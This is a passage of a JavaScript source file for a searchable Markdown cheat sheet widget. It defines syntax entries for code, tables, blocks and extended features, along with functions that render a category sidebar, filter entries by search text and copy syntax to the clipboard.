                rendered: '<pre style="margin:0;"><code>indented code\nanother line</code></pre>',
                notes: 'Indent with 4 spaces or 1 tab. Fenced blocks are preferred.'
            },
            {
                name: 'Supported Languages',
                syntax: '```bash\n```python\n```javascript\n```json\n```sql\n```xml\n```powershell\n```yaml',
                rendered: '<span class="command-row-cmd" style="display:block;font-size:12px;">bash &bull; python &bull; javascript &bull; json &bull; sql &bull; xml &bull; powershell &bull; yaml &bull; c &bull; cpp &bull; java &bull; php &bull; ruby &bull; go &bull; rust</span>',
                notes: 'Common language identifiers for fenced code blocks.'
            },
            {
                name: 'Escaping Backticks',
                syntax: '`` `code with backticks` ``',
                rendered: '<code>`code with backticks`</code>',
                notes: 'Use double backticks to include literal backticks in inline code.'
            }
        ],
        tables: [
            {
                name: 'Basic Table',
                syntax: '| Header 1 | Header 2 |\n| -------- | -------- |\n| Cell 1   | Cell 2   |\n| Cell 3   | Cell 4   |',
                rendered: '<table style="border-collapse:collapse;width:100%;font-size:13px;"><thead><tr><th style="border:1px solid var(--border-primary);padding:6px 10px;text-align:left;">Header 1</th><th style="border:1px solid var(--border-primary);padding:6px 10px;text-align:left;">Header 2</th></tr></thead><tbody><tr><td style="border:1px solid var(--border-primary);padding:6px 10px;">Cell 1</td><td style="border:1px solid var(--border-primary);padding:6px 10px;">Cell 2</td></tr><tr><td style="border:1px solid var(--border-primary);padding:6px 10px;">Cell 3</td><td style="border:1px solid var(--border-primary);padding:6px 10px;">Cell 4</td></tr></tbody></table>',
                notes: 'Pipes and hyphens create tables. Outer pipes are optional.'
            },
            {
                name: 'Column Alignment',
                syntax: '| Left     | Center   | Right    |\n| :------- | :------: | -------: |\n| left     | center   | right    |',
                rendered: '<table style="border-collapse:collapse;width:100%;font-size:13px;"><thead><tr><th style="border:1px solid var(--border-primary);padding:6px 10px;text-align:left;">Left</th><th style="border:1px solid var(--border-primary);padding:6px 10px;text-align:center;">Center</th><th style="border:1px solid var(--border-primary);padding:6px 10px;text-align:right;">Right</th></tr></thead><tbody><tr><td style="border:1px solid var(--border-primary);padding:6px 10px;text-align:left;">left</td><td style="border:1px solid var(--border-primary);padding:6px 10px;text-align:center;">center</td><td style="border:1px solid var(--border-primary);padding:6px 10px;text-align:right;">right</td></tr></tbody></table>',
                notes: 'Use colons in the separator row to align columns.'
            }
        ],
        blocks: [
            {
                name: 'Blockquote',
                syntax: '> This is a quote',
                rendered: '<blockquote style="border-left:3px solid var(--brand-primary);margin:0;padding:4px 12px;color:var(--text-secondary);">This is a quote</blockquote>',
                notes: 'Use > at the start of a line.'
            },
            {
                name: 'Nested Blockquote',
                syntax: '> Outer quote\n>> Nested quote',
                rendered: '<blockquote style="border-left:3px solid var(--brand-primary);margin:0;padding:4px 12px;color:var(--text-secondary);">Outer quote<blockquote style="border-left:3px solid var(--border-primary);margin:4px 0 0 0;padding:4px 12px;">Nested quote</blockquote></blockquote>',
                notes: 'Use >> for nested quotes.'
            },
            {
                name: 'Horizontal Rule',
                syntax: '---',
                rendered: '<hr style="border:none;border-top:1px solid var(--border-primary);margin:8px 0;">',
                notes: 'Also works with *** or ___. Must be 3+ characters.'
            },
            {
                name: 'Footnote',
                syntax: 'Text with a footnote.[^1]\n\n[^1]: Footnote content here.',
                rendered: 'Text with a footnote.<sup style="color:var(--brand-primary);">1</sup><br><hr style="border:none;border-top:1px solid var(--border-primary);margin:8px 0;"><small><sup>1</sup> Footnote content here.</small>',
                notes: 'Extended syntax. Footnotes render at the bottom of the document.'
            },
            {
                name: 'Escape Characters',
                syntax: '\\* Not italic \\*\n\\# Not a heading\n\\[ Not a link \\]',
                rendered: '* Not italic *<br># Not a heading<br>[ Not a link ]',
                notes: 'Backslash escapes special characters: \\ ` * _ { } [ ] ( ) # + - . ! |'
            }
        ],
        extended: [
            {
                name: 'Heading ID',
                syntax: '### My Heading {#custom-id}',
                rendered: '<span style="font-weight:700;">My Heading</span> <small style="color:var(--color-text-tertiary);">Anchor: #custom-id</small>',
                notes: 'Allows linking directly to headings. Not all renderers support this.'
            },
            {
                name: 'Emoji (shortcodes)',
                syntax: ':joy: :thumbsup: :rocket:',
                rendered: '😂 👍 🚀',
                notes: 'Shortcode support varies by platform. GitHub, GitLab support this.'
            },
            {
                name: 'HTML in Markdown',
                syntax: '<details>\n<summary>Click to expand</summary>\nHidden content here.\n</details>',
                rendered: '<details><summary style="cursor:pointer;color:var(--brand-primary);">Click to expand</summary><div style="padding:4px 0;">Hidden content here.</div></details>',
                notes: 'Most renderers allow inline HTML. Useful for collapsible sections.'
            },
            {
                name: 'Automatic URL Links',
                syntax: 'https://example.com',
                rendered: '<a href="#" style="color:var(--brand-primary);">https://example.com</a>',
                notes: 'Many renderers auto-link bare URLs. For guaranteed linking, use <url> or [text](url).'
            },
            {
                name: 'Abbreviation',
                syntax: '*[HTML]: Hyper Text Markup Language\n\nThe HTML specification.',
                rendered: 'The <abbr title="Hyper Text Markup Language">HTML</abbr> specification.',
                notes: 'Extended syntax. Limited renderer support.'
            }
        ]
    },

    init() {
        const searchInput = document.getElementById('mdCheatSearch');
        if (searchInput) {
            searchInput.addEventListener('input', (e) => {
                this.searchQuery = e.target.value.trim().toLowerCase();
                this.renderEntries();
            });
        }
    },

    render() {
        const categoryItems = Object.entries(this.CATEGORIES).map(([key, cat]) => `
            <div class="category-item ${this.activeCategory === key ? 'active' : ''}"
                 onclick="MarkdownCheatSheet.switchCategory('${key}')">
                <span class="category-icon">${cat.icon}</span>
                <span class="category-name">${cat.label}</span>
                <span class="category-count">${this.ENTRIES[key].length}</span>
            </div>
        `).join('');

        return `
            <div class="commands-page embedded">
                <aside class="commands-sidebar">
                    <div class="commands-sidebar-header">
                        <h3>Categories</h3>
                    </div>
                    <div class="category-list">
                        ${categoryItems}
                    </div>
                </aside>

                <main class="commands-main">
                    <div class="commands-header">
                        <div class="commands-search">
                            <i data-lucide="search" class="search-icon"></i>
                            <input type="text" id="mdCheatSearch" placeholder="Search markdown syntax..." autocomplete="off">
                        </div>
                        <div class="commands-header-actions">
                            <span id="mdCheatCount" class="commands-count">${this.ENTRIES[this.activeCategory].length} items</span>
                        </div>
                    </div>
                    <div id="mdCheatList" class="commands-grid">
                        ${this.renderEntries(true)}
                    </div>
                </main>
            </div>
        `;
    },

    switchCategory(category) {
        this.activeCategory = category;
        this.searchQuery = '';
        const searchInput = document.getElementById('mdCheatSearch');
        if (searchInput) searchInput.value = '';

        // Update sidebar active state
        document.querySelectorAll('.commands-sidebar .category-item').forEach(item => {
            item.classList.remove('active');
        });
        const activeItem = document.querySelector(`.commands-sidebar .category-item[onclick*="${category}"]`);
        if (activeItem) activeItem.classList.add('active');

        this.renderEntries();
    },

    renderEntries(returnHtml = false) {
        let entries = this.ENTRIES[this.activeCategory] || [];

        if (this.searchQuery) {
            // Search across all categories
            entries = [];
            for (const [catKey, catEntries] of Object.entries(this.ENTRIES)) {
                for (const entry of catEntries) {
                    if (entry.name.toLowerCase().includes(this.searchQuery) ||
                        entry.syntax.toLowerCase().includes(this.searchQuery) ||
                        entry.notes.toLowerCase().includes(this.searchQuery)) {
                        entries.push({ ...entry, _category: this.CATEGORIES[catKey].label });
                    }
                }
            }
        }

        const countEl = document.getElementById('mdCheatCount');
        if (countEl) {
            countEl.textContent = `${entries.length} item${entries.length !== 1 ? 's' : ''}`;
        }

        const html = entries.length === 0
            ? `<div class="empty-state"><p>No matching syntax found</p></div>`
            : `<div class="commands-list-compact">
                ${entries.map(entry => this.renderEntry(entry)).join('')}
              </div>`;

        if (returnHtml) return html;

        const container = document.getElementById('mdCheatList');
        if (container) {
            container.innerHTML = html;
            if (typeof lucide !== 'undefined') lucide.createIcons();
        }
    },

    renderEntry(entry) {
        const categoryBadge = entry._category
            ? `<span class="command-row-category" style="font-size:11px;opacity:0.7;">${entry._category}</span>`
            : '';

        // Use data attribute for safe syntax storage
        const syntaxAttr = entry.syntax.replace(/&/g, '&amp;').replace(/"/g, '&quot;');

        return `
            <div class="md-cheat-entry" data-syntax="${syntaxAttr}">
                <div class="md-cheat-header">
                    <span class="md-cheat-name">${escapeHtml(entry.name)}</span>
                    ${categoryBadge}
                    <button class="btn btn-xs btn-primary" onclick="MarkdownCheatSheet.copySyntax(this)" title="Copy syntax">
                        <i data-lucide="copy"></i>
                    </button>
                </div>
                <div class="md-cheat-body">
                    <div class="md-cheat-syntax">
                        <div class="md-cheat-label">Markdown</div>
                        <pre>${escapeHtml(entry.syntax)}</pre>
                    </div>
                    <div class="md-cheat-rendered">
                        <div class="md-cheat-label">Result</div>
                        <div class="md-cheat-preview">${entry.rendered}</div>
                    </div>
                </div>
                ${entry.notes ? `<div class="md-cheat-notes">${escapeHtml(entry.notes)}</div>` : ''}
            </div>
        `;
    },

    copySyntax(btn) {
        const entry = btn.closest('.md-cheat-entry');
        const syntax = entry ? entry.dataset.syntax : '';
        navigator.clipboard.writeText(syntax).then(() => {
            const origHtml = btn.innerHTML;
            btn.innerHTML = '<i data-lucide="check"></i>';
            if (typeof lucide !== 'undefined') lucide.createIcons();
            setTimeout(() => {
                btn.innerHTML = origHtml;
                if (typeof lucide !== 'undefined') lucide.createIcons();
            }, 1500);
        });
    }
};

window.MarkdownCheatSheet = MarkdownCheatSheet;
